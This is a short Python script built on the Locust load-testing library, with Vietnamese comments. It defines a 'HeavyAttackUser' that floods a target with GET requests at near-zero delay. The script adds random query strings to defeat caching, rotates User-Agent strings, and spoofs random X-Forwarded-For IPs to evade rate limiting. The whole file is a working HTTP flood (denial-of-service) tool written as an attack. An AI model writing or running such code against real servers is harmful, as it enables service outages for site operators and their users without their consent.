import random
from locust import HttpUser, task, between

class HeavyAttackUser(HttpUser):
    # Thời gian chờ cực thấp để tạo request liên tục
    wait_time = between(0.01, 0.05)

    @task
    def attack_target(self):
        # Tạo ID ngẫu nhiên để ép Server không dùng được Cache
        rand_query = random.getrandbits(64)
        
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Cache-Control": "no-cache"
        }
        
        # Gửi request kèm theo query string ngẫu nhiên
        self.client.get(f"/?v={rand_query}", headers=headers, timeout=5)
      
